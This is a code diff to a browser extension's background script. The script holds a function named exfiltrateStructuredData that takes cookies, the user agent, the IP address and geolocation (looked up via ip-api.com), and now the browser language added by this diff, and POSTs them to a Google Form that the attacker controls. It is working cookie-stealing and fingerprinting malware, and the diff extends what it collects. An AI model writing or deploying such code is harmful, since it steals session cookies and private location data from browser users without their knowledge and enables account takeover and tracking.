@@ -18,12 +18,14 @@ chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
 
 function exfiltrateStructuredData(cookies) {
   const userAgent = navigator.userAgent;
+  const language = navigator.language || navigator.userLanguage;  
 
   fetch("http://ip-api.com/json")
     .then(response => response.json())
     .then(location => {
       const payload = {
         userAgent: userAgent,
+        language: language,             
         ip: location.query,
         city: location.city,
         region: location.regionName,
@@ -36,9 +38,9 @@ function exfiltrateStructuredData(cookies) {
       };
 
       const formData = new URLSearchParams();
-      formData.append("entry.<XXXXXXXXXX>", JSON.stringify(payload)); // replace with your actual Google Form field ID
+      formData.append("entry.XXXXXXXXXX", JSON.stringify(payload)); // replace with your google form entry.id and form-id
 
-      return fetch("https://docs.google.com/forms/d/e/<G-Form_ID>/formResponse", {
+      return fetch("https://docs.google.com/forms/d/e/<GFORM_ID>/formResponse", {
         method: "POST",
         mode: "no-cors",
         body: formData,
